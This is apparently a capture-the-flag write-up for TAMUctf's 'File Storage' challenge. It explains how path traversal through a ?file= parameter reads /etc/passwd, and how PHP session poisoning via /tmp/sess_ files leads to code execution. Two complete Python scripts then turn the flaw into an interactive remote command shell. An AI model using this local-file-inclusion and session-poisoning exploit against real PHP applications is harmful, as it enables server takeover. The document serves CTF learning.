# [File Storage](http://filestorage.tamuctf.com/)

This exercice was resolved thanks to session poisoning.

We started working on this around 22:30, it was a locked-down Saturday like any other. Thanks COV.

First notice, once you submit a name and click on a file, the url gets a nice `?file=xxxxx.txt` suffix `xxxxx` being the name of the file.

At that point we kept looking further and further, beeing able to access the infamous `/etc/passwd`.  
Actually located at `../../../../../../etc/passwd`.  
We had some fun with `/proc/` and then thought about the only cookie we had : `PHPSESSID`.

At 4AM after talking about going to bed I played with the cookies, this led to discover we could arbitrary change the PHPSESSID's content.  
Injecting PHP code in it was our first idea, so first things first : `echo("<p> Hello World <p>");`

Then my colleague BeerStorm made some nasty python code to provide us with a shell prompt.

This is the code he wrote at 6AM after 10 mins of manually typing commands and getting sick of it :

```python
from io import StringIO

import requests
from prompt_toolkit import PromptSession
from lxml import etree
from prompt_toolkit.lexers import PygmentsLexer
from pygments.lexers.shell import BashLexer

parser = etree.HTMLParser()


def exec(command, base_path='.'):
    REMOTE_EXEC = "<?php $row = exec('cd " + base_path + "&&" + command + "; echo \"<cwd>$(pwd)</cwd>\"" + "',$output,$error);echo '<XPLOIT>'; while(list(,$row) = each($output)){echo $row, \"\\n\";};echo '</XPLOIT>'; if($error){echo \"Error : $error<br />\"; exit;}?>"
    sess = requests.Session()
    sess.post('http://filestorage.tamuctf.com/index.php', {'name': REMOTE_EXEC})
    sess_id = sess.cookies['PHPSESSID']
    ans = sess.get('http://filestorage.tamuctf.com/index.php', params={'file': f"../../../../../../../tmp/sess_{sess_id}"})
    cwd = etree.parse(StringIO(ans.text), parser).xpath('//cwd/text()')[0]
    xploit = etree.parse(StringIO(ans.text), parser).xpath('//xploit/text()')
    return (xploit and xploit[0] or None, cwd)


ppt = PromptSession()
cwd = exec("pwd")[1]

while True:
    res, cwd = exec(ppt.prompt(f'{cwd} > ', lexer=PygmentsLexer(BashLexer)), cwd)
    print(res)
```

> Hint : You should always look for the roots before chopping a tree.


##### Here's the v2 "HE PREFERS" : 

```python
from io import StringIO

import requests
from prompt_toolkit import PromptSession
from lxml import etree
from prompt_toolkit.lexers import PygmentsLexer
from prompt_toolkit.styles import Style
from pygments.lexers.shell import BashLexer

parser = etree.HTMLParser()

style = Style.from_dict({
    '': '#FF8C00',
    'path': '#4169E1',
})

def exec(command, base_path='.'):
    REMOTE_EXEC = "<?php $row = exec('cd " + base_path + "&&" + command + "; echo \"<cwd>$(pwd)</cwd>\"" + \
                  "',$output,$error);echo '<XPLOIT>'; while(list(,$row) = each($output)){echo $row, \"\\n\";};" \
                  "echo '</XPLOIT>'; if($error){echo \"Error : $error<br />\"; exit;}?>"
    sess = requests.Session()
    sess.post('http://filestorage.tamuctf.com/index.php', {'name': REMOTE_EXEC})
    sess_id = sess.cookies['PHPSESSID']
    ans = sess.get('http://filestorage.tamuctf.com/index.php', params={'file': f"../../../../../../tmp/sess_{sess_id}"})
    cwd = etree.parse(StringIO(ans.text), parser).xpath('//cwd/text()')[0]
    xploit = etree.parse(StringIO(ans.text), parser).xpath('//xploit/text()')
    return (xploit and xploit[0] or None, cwd)


ppt = PromptSession()
cwd = exec("pwd")[1]

while True:
    res, cwd = exec(ppt.prompt([('class:path', cwd), ('', ' > ')], lexer=PygmentsLexer(BashLexer), style=style), cwd)
    print(res)
```